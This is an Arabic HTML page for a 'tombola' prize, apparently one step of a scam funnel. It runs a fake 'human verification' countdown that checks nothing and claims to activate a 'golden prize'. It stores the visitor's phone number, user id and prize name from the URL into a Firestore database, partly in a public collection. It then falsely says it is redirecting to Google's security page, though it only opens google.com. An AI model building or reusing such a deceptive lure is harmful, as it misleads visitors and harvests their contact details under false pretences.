<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق الأمان | طومبولا الحظ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
    <style>body { font-family: 'Cairo', sans-serif; background: #f0f4f8; }</style>
</head>
<body class="flex items-center justify-center h-screen">
    <div class="max-w-sm w-full bg-white p-8 rounded-3xl shadow-2xl border-t-8 border-amber-400 text-center">
        <h1 class="text-2xl font-black text-slate-800 mb-2">تحقق بشري</h1>
        <p class="text-slate-500 mb-6 text-sm">انتظر قليلاً ليتم تفعيل جائزتك الذهبية</p>
        
        <div class="text-6xl font-black text-amber-500 mb-6" id="timer">15</div>
        
        <div id="status" class="hidden">
            <div class="bg-green-100 text-green-700 p-3 rounded-xl font-bold mb-4 animate-bounce">
                ✅ تم التفعيل بنجاح!
            </div>
            <p class="text-xs text-slate-400">جاري توجيهك إلى صفحة الأمان من جوجل...</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
        import { getFirestore, doc, setDoc, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCYipCdnHZXCkO3qKN9AqaWM9IDf9rOv04",
            authDomain: "soug-62f2f.firebaseapp.com",
            projectId: "soug-62f2f",
            storageBucket: "soug-62f2f.firebasestorage.app",
            messagingSenderId: "672944475308",
            appId: "1:672944475308:web:c8158bdf2c5613f51c2309"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const params = new URLSearchParams(window.location.search);
        
        const uid = params.get('uid');
        const index = params.get('index');
        const phone = params.get('phone');
        const prizeName = params.get('prize');

        let timeLeft = 15;
        const timerEl = document.getElementById('timer');

        const countdown = setInterval(async () => {
            timeLeft--;
            timerEl.innerText = timeLeft;

            if (timeLeft <= 0) {
                clearInterval(countdown);
                const ticketNum = `GOLD-${Math.floor(10000 + Math.random() * 90000)}`;
                const appId = "tombola-luck-v1";

                try {
                    // تحديث قاعدة البيانات
                    await setDoc(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${index}`), {
                        active: true, phone: phone, ticketNumber: ticketNum, timestamp: serverTimestamp()
                    }, { merge: true });

                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'all_activations'), {
                        userId: uid, phone: phone, prizeName: prizeName, ticketNumber: ticketNum, activatedAt: serverTimestamp()
                    });

                    document.getElementById('status').classList.remove('hidden');
                    timerEl.classList.add('hidden');

                    // التوجيه لجوجل بعد ثانية ونصف
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 1500);
                } catch (e) { alert("خطأ في الاتصال بالسيرفر"); }
            }
        }, 1000);
    </script>
</body>
</html>
